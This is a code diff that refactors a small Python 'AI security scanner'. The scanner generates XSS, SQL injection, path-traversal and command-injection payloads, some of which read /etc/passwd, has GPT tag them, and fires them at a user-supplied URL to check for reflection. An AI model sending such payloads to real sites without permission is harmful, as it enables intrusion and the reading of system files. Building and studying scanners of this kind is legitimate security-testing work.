@@ -1,105 +1,45 @@
-import random, os, openai, requests, csv, json
-from datetime import datetime
+from modules.payloads.generator import generate_all
+from modules.tagging.gpt_tagger import tag_payloads
+from modules.testing.tester import test_payloads
+from modules.utils.logger import log
+import csv, json, os
+
+# Ensure output directory exists
+os.makedirs("output", exist_ok=True)
 
 # Step 1: Generate Payloads
-def generate_payloads():
-    def xss(): return [f"<script>alert({i})</script>" for i in range(1, 201)]
-    def sqli(): return [f"' OR {i}={i} --" for i in range(1, 201)]
-    def lfi(): return [f"../../{'../'*i}etc/passwd" for i in range(1, 201)]
-    def rce(): return [f"; cat /etc/passwd #{i}" for i in range(1, 201)]
+payloads = generate_all()
+log(f"Generated {len(payloads)} payloads")
 
-    payloads = xss() + sqli() + lfi() + rce()
-    random.shuffle(payloads)
+# Step 2: Tag with GPT
+log("Tagging first 100 payloads using GPT...")
+tagged = tag_payloads(payloads[:100])
 
-    with open("payloads.txt", "w") as f:
-        for p in payloads:
-            f.write(p + "\n")
+# Step 3: Save tagged payloads
+with open("output/payloads_tagged.json", "w") as jf:
+    json.dump(tagged, jf, indent=2)
 
-    print(f"[✓] Generated {len(payloads)} payloads.")
+with open("output/payloads_tagged.csv", "w") as cf:
+    writer = csv.DictWriter(cf, fieldnames=["payload", "tag", "time"])
+    writer.writeheader()
+    writer.writerows(tagged)
 
-# Step 2: GPT Tagging + Scoring
-def tag_payloads(api_key):
-    openai.api_key = api_key
-    with open("payloads.txt") as f: payloads = f.read().splitlines()
+log("Tagged payloads saved")
 
-    results = []
+# Step 4: Get target URL
+url = input("Enter target website URL (e.g. http://demo.testfire.net): ")
 
-    print(f"[•] Tagging first 100 payloads using GPT...")
-    for p in payloads[:100]:
-        try:
-            res = openai.ChatCompletion.create(
-                model="gpt-3.5-turbo",
-                messages=[
-                    {"role": "system", "content": "Tag this payload as XSS, SQLi, LFI, RCE, or Unknown. Also rate its risk level as High, Medium, Low."},
-                    {"role": "user", "content": f"Payload: {p}"}
-                ]
-            )
-            content = res['choices'][0]['message']['content']
-        except Exception as e:
-            content = f"ERROR: {e}"
+# Step 5: Test payloads on URL
+log(f"Testing payloads against: {url}")
+results = test_payloads(payloads[:100], url)
 
-        results.append({
-            "payload": p,
-            "gpt_tag": content,
-            "timestamp": datetime.now().isoformat()
-        })
+# Step 6: Save test results
+with open("output/results.json", "w") as jf:
+    json.dump(results, jf, indent=2)
 
-    with open("payloads_tagged.json", "w") as f:
-        json.dump(results, f, indent=2)
+with open("output/results.csv", "w") as cf:
+    writer = csv.DictWriter(cf, fieldnames=["payload", "reflected", "error"])
+    writer.writeheader()
+    writer.writerows(results)
 
-    with open("payloads_tagged.csv", "w", newline='') as csvfile:
-        fieldnames = ["payload", "gpt_tag", "timestamp"]
-        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
-        writer.writeheader()
-        writer.writerows(results)
-
-    print(f"[✓] Tagged payloads saved to payloads_tagged.json and .csv")
-
-# Step 3: Test Payloads Against a Target
-def test_payloads(url):
-    with open("payloads.txt") as f: payloads = f.read().splitlines()
-    results = []
-
-    print(f"[•] Testing payloads against: {url}")
-    for p in payloads[:100]:  # Test 100 for speed
-        try:
-            r = requests.get(url, params={"input": p}, timeout=10)
-            is_reflected = p in r.text
-            results.append({
-                "payload": p,
-                "reflected": is_reflected
-            })
-        except Exception as e:
-            results.append({
-                "payload": p,
-                "reflected": False,
-                "error": str(e)
-            })
-
-    with open("results.json", "w") as f:
-        json.dump(results, f, indent=2)
-
-    with open("results.csv", "w", newline='') as f:
-        writer = csv.DictWriter(f, fieldnames=["payload", "reflected", "error"])
-        writer.writeheader()
-        for r in results:
-            if "error" not in r: r["error"] = ""
-            writer.writerow(r)
-
-    print(f"[✓] Testing results saved to results.json and .csv")
-
-# Step 4: Orchestrator
-def main():
-    print("=== Agentic AI Security Scanner ===")
-    generate_payloads()
-
-    api_key = input("Enter your OpenAI API key: ")
-    tag_payloads(api_key)
-
-    url = input("Enter target website URL (e.g. http://demo.testfire.net): ")
-    test_payloads(url)
-
-    print("=== Done! All outputs saved. ===")
-
-if __name__ == "__main__":
-    main()
+log("Testing results saved to output/")
